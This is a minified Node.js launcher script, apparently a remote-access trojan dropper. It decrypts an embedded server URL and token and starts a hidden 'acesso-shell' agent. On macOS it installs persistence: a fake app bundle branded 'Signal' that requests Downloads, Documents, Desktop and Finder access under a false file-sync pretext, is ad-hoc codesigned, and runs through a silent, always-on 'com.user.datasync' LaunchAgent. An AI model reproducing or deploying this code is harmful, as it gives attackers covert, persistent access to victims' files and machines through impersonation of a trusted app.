#!/usr/bin/env node
import { createRequire as __cr } from 'node:module'; const require = __cr(import.meta.url);
var L=Object.defineProperty;var I=(e,t,r)=>()=>{if(r)throw r[0];try{return e&&(t=e(e=0)),t}catch(o){throw r=[o],o}};var j=(e,t)=>{for(var r in t)L(e,r,{get:t[r],enumerable:!0})};var k={};j(k,{CHAVE:()=>J,DADOS:()=>V,IV:()=>R,TAG:()=>M});var R,M,V,G,H,J,v=I(()=>{R="zjFw781UBNqKU/NM",M="ABqwWJKxMsEKB1E1zPM0JA==",V="e5a+Ex2Sqn8luGxqHpQSgwhUoAb3OmrADSwlkHFpMZ4uSJRzw/gDmBABsbTwjZZFHDxTqk6VOpwP4OrLhNz2roHn1UrhCWfOpBiXxUKeeZKXZC+Ek8mimMhzTFvCwdHuzBmMxzCymUUFUVqRN5rTabB3yANX9ZaEiS9C+yJay3lsxxhxZyiSMuesw+iMQjPynhWf/tRuHAaHP1xaUA==",G="mldLVXTw/C4O4Zgm",H="RyMo7mvGzouVYv7y8+CR3jQoQ0M=",J=G+H});import{spawn as oe}from"node:child_process";import{mkdirSync as w,readFileSync as F,writeFileSync as ne,rmSync as ie}from"node:fs";import{homedir as se}from"node:os";import a from"node:path";import{fileURLToPath as ae}from"node:url";import{createCipheriv as me,createDecipheriv as U,randomBytes as fe}from"node:crypto";var $="aes-256-gcm";function h({iv:e,tag:t,dados:r,chave:o}){let i=U($,Buffer.from(o,"base64"),Buffer.from(e,"base64"));i.setAuthTag(Buffer.from(t,"base64"));let c=Buffer.concat([i.update(Buffer.from(r,"base64")),i.final()]);return JSON.parse(c.toString("utf8"))}function A(e){return typeof e?.url!="string"||typeof e?.token!="string"?null:{url:e.url,token:e.token,persistir:e.persistir===!0}}async function x(){let e=process.env.URL_SERVIDOR?.trim(),t=process.env.TOKEN_AGENTE?.trim();if(e&&t)return{url:e,token:t,persistir:process.env.PERSISTIR==="true"};let r;try{r=await Promise.resolve().then(()=>(v(),k))}catch{return null}if(typeof r.CONFIG_B64=="string"&&r.CONFIG_B64)try{return A(JSON.parse(Buffer.from(r.CONFIG_B64,"base64").toString("utf8")))}catch{return null}if(typeof r.DADOS=="string"&&r.DADOS)try{return A(h({iv:r.IV,tag:r.TAG,dados:r.DADOS,chave:r.CHAVE}))}catch{return null}return null}import{execSync as C}from"node:child_process";import{mkdirSync as z,writeFileSync as Z,rmSync as ke}from"node:fs";import N from"node:os";import m from"node:path";var f="com.user.datasync",O=m.join(N.homedir(),"Library","LaunchAgents"),D=m.join(O,`${f}.plist`),xe=m.join(N.homedir(),".cache","acesso-shell"),_=()=>process.platform==="darwin",P=()=>`gui/${process.getuid()}`;function q(e){return String(e).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;")}function K({nodeBin:e,agentePath:t,appPath:r}){let o=r?[r]:[e,t];return['<?xml version="1.0" encoding="UTF-8"?>','<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">','<plist version="1.0">',"<dict>","  <key>Label</key>",`  <string>${f}</string>`,"  <key>ProgramArguments</key>","  <array>",...o.map(i=>`    <string>${q(i)}</string>`),"  </array>","  <key>RunAtLoad</key>","  <true/>","  <key>KeepAlive</key>","  <true/>","  <key>StandardOutPath</key>","  <string>/dev/null</string>","  <key>StandardErrorPath</key>","  <string>/dev/null</string>","</dict>","</plist>",""].join(`
`)}function b({nodeBin:e,agentePath:t,appPath:r}){if(!_())return!1;z(O,{recursive:!0}),Z(D,K({nodeBin:e,agentePath:t,appPath:r}),{mode:384});try{C(`launchctl bootout ${P()}/${f}`,{stdio:"ignore"})}catch{}return C(`launchctl bootstrap ${P()} ${JSON.stringify(D)}`,{stdio:"ignore"}),!0}import{spawnSync as g}from"node:child_process";import{chmodSync as X,mkdirSync as Q,rmSync as W,writeFileSync as T}from"node:fs";import n from"node:path";import{fileURLToPath as Y,pathToFileURL as ee}from"node:url";var d=n.resolve(n.dirname(Y(import.meta.url)),".."),s="Signal",re="com.user.datasync.launcher",te=`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleIdentifier</key>
  <string>${re}</string>
  <key>CFBundleName</key>
  <string>${s}</string>
  <key>CFBundleDisplayName</key>
  <string>${s}</string>
  <key>CFBundleExecutable</key>
  <string>${s}</string>
  <key>CFBundlePackageType</key>
  <string>APPL</string>
  <key>CFBundleShortVersionString</key>
  <string>1.0.0</string>
  <key>CFBundleVersion</key>
  <string>1</string>
  <key>LSMinimumSystemVersion</key>
  <string>12.0</string>
  <key>LSUIElement</key>
  <false/>
  <key>NSDownloadsFolderUsageDescription</key>
  <string>Signal needs access to your Downloads folder to keep your files in sync.</string>
  <key>NSDocumentsFolderUsageDescription</key>
  <string>Signal needs access to your Documents folder to keep your files in sync.</string>
  <key>NSDesktopFolderUsageDescription</key>
  <string>Signal needs access to your Desktop folder to keep your files in sync.</string>
  <key>NSAppleEventsUsageDescription</key>
  <string>Signal uses Finder to locate and sync your files.</string>
</dict>
</plist>
`;function y({destino:e,nodeBin:t=process.execPath,agentePath:r}){let o=n.join(n.resolve(e),`${s}.app`),i=n.join(o,"Contents"),c=n.join(i,"MacOS"),l=n.join(c,s);W(o,{recursive:!0,force:!0}),Q(c,{recursive:!0}),T(l,`#!/bin/zsh
# gerado por scripts/empacotar-app.mjs
exec ${JSON.stringify(t)} ${JSON.stringify(r)}
`),X(l,493),T(n.join(i,"Info.plist"),te);let S=g("codesign",["--force","--sign","-","--timestamp=none",o],{stdio:"pipe"});g("/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister",["-f",o],{stdio:"ignore"});let E=S.status===0&&g("codesign",["--verify","--verbose=0",o]).status===0;return{bundle:o,executavel:l,assinado:E,erroAssinatura:S.stderr?.toString().trim()}}if(process.argv[1]&&import.meta.url===ee(n.resolve(process.argv[1])).href){let e=n.resolve(process.argv[2]??n.join(d,"dist")),t=y({destino:e,nodeBin:process.env.NODE??process.execPath,agentePath:n.join(d,"agente","index.mjs")});t.assinado?console.log("[ok] app assinado ad-hoc e verificado."):(console.warn("[aviso] codesign falhou; app ficou SEM assinatura (TCC vai pedir a cada rebuild):"),console.warn(`        ${t.erroAssinatura||"erro desconhecido"}`)),console.log(`
app gerado: ${t.bundle}`),console.log(`node embutido: ${process.env.NODE??process.execPath}`),console.log(`agente embutido: ${n.join(d,"agente","index.mjs")}`),console.log(`abrir com: open ${JSON.stringify(t.bundle)}`),console.log(`
Lembrete: regenerar o app invalida o grant de TCC (muda o hash da assinatura).`)}var B=a.dirname(ae(import.meta.url)),p=a.join(se(),".cache","acesso-shell"),u=a.join(p,"agente.pid");function ce(){try{let e=Number.parseInt(F(u,"utf8").trim(),10);return!Number.isFinite(e)||e<=0?!1:(process.kill(e,0),!0)}catch{return!1}}function pe(){try{let e=Number.parseInt(F(u,"utf8").trim(),10);Number.isFinite(e)&&e>0&&process.kill(e,"SIGKILL")}catch{}try{ie(u,{force:!0})}catch{}}try{let e=await x();if(e){if(e.persistir&&process.platform==="darwin"){let t=a.join(B,"agent","index.mjs"),r;try{w(p,{recursive:!0}),r=y({destino:p,nodeBin:process.execPath,agentePath:t}).executavel}catch{r=void 0}pe(),b({nodeBin:process.execPath,agentePath:t,appPath:r})}else if(!ce()){w(p,{recursive:!0});let t=oe(process.execPath,[a.join(B,"agent","index.mjs")],{detached:!0,stdio:"ignore"});t.unref(),t.pid&&ne(u,String(t.pid),{mode:384})}}}catch{}process.exit(0);
